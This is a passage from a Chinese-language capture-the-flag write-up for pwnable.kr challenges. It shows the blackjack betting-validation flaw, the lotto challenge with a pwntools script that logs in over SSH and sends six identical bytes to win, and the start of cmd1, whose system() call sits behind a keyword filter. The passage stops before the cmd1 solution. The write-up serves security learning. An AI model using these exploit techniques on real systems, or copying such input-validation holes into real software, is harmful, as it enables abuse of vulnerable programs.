punctuation">)</span><span class="token punctuation">;</span>         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;</span>dealer_total<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player's total is less than dealer's total, loss</span>      <span class="token punctuation">{</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has the Better Hand. You Lose.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If dealer's total is more than 21, win</span>      <span class="token punctuation">{</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>         <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">void</span> <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Test for if user has cash remaining in purse</span><span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>cash <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Once user has zero remaining cash, game ends and prompts user to play again</span>     <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You Are Bankrupt. Game Over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cash <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>        <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Asks user amount to bet</span><span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nEnter Bet: $"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>bet <span class="token operator">></span> cash<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player tries to bet more money than player has</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou cannot bet more money than you have."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter Bet: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bet<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">return</span> bet<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">void</span> <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Function for asking player if they want to play again</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWould You Like To Play Again?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nPlease Enter Y for Yes or N for No\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>    <span class="token punctuation">{</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue.</span>    <span class="token punctuation">{</span>             <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, exit program</span>    <span class="token punctuation">{</span>        <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nBYE!!!!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span><span class="token keyword">void</span> <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Prints results into Blackjack.txt file in program directory</span><span class="token punctuation">{</span>    FILE <span class="token operator">*</span>fpresults<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//File pointer is fpresults</span>    fpresults <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>RESULTS<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Creates file and writes into it</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fpresults <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// what to do if file missing from directory</span>    <span class="token punctuation">{</span>               <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nError: File Missing\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>          <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\n\t RESULTS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\n\t---------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nYou Have Won %d Times\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nYou Have Lost %d Times\n"</span><span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nKeep Playing and Set an All-Time Record!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token function">fclose</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span></code></pre><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>问题主要出自betting函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Asks user amount to bet</span><span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nEnter Bet: $"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>bet <span class="token operator">></span> cash<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player tries to bet more money than player has</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou cannot bet more money than you have."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter Bet: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bet<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">return</span> bet<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span></code></pre><ol><li>选择在第二次输入时直接输1000000，无脑赌到赢</li><li>选择第一次输入-1000000，无脑赌到输</li></ol><p>因为最后计算金额时候，不是<code>cash = cash + bet;</code>就是<code>cash = cash - bet;</code>分别对应两种利用</p><h3 id="解题-11"><a href="#解题-11" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">YaY_I_AM_A_MILLIONARE_LOLCash: $1000500-------|H    ||  2  ||    H|-------Your Total is 2The Dealer Has a Total of 10</code></pre><h2 id="13-lotto"><a href="#13-lotto" class="headerlink" title="13. lotto"></a>13. lotto</h2><h3 id="题目-12"><a href="#题目-12" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> submit<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Submit your 6 lotto bytes : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> r<span class="token punctuation">;</span>    r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> submit<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Lotto Start!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//sleep(1);</span>    <span class="token comment" spellcheck="true">// generate lotto numbers</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> lotto<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> lotto<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error2. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 ~ 45</span>    <span class="token punctuation">}</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// calculate lotto score</span>    <span class="token keyword">int</span> match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> submit<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                match<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// win!</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>match <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad luck...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- nLotto Rule -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your goal is to match lotto numbers as many as you can\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"if you win lottery for *1st place*, you will get reward\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"for more details, follow the link below\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"mathematical chance to win this game is known to be 1/8145060.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// menu</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> menu<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- Select Menu -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1. Play Lotto\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2. Help\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3. Exit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>menu<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>                <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"invalid menu\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>原来这里两层循环来判断提交的值是否<strong>都</strong>在 lotto 中出现，但是逻辑上是有问题的</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// calculate lotto score</span>    <span class="token keyword">int</span> match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> submit<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                match<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>实际上这段代码是检测提交的值是否在 lotto 中出现，和原来本意有很大的出入，因为我们可以输入 6 同样的值，只要保证这个值在 lotto 里出现即可完成破解</p><h3 id="解题-12"><a href="#解题-12" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>conn <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"lotto"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> conn<span class="token punctuation">.</span>process<span class="token punctuation">(</span>executable<span class="token operator">=</span><span class="token string">"/home/lotto/lotto"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Exit"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bytes :"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bad luck..."</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="14-cmd1"><a href="#14-cmd1" class="headerlink" title="14. cmd1"></a>14. cmd1</h2><h3 id="题目-13"><a href="#题目-13" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"tmp"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PATH=/thankyouverymuch"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><ul><li>strstr：返回字符串str中第一次出现子串substr的地址；如果没有检索到子串，则返回NULL</li></ul><p>filter 中过滤了三个字符串<code>flag</code>、<code>sh</code>、<code>tmp</code></p><p>但是？？？还是没明白和 PATH 的关系</p><h3 id="解题-13"><a href="#解题-13" class="headerlink" title="解题"></a>解题</h3><p>通配符直接上，跟题目没太大关系</p><pre class=" language-shell"><code 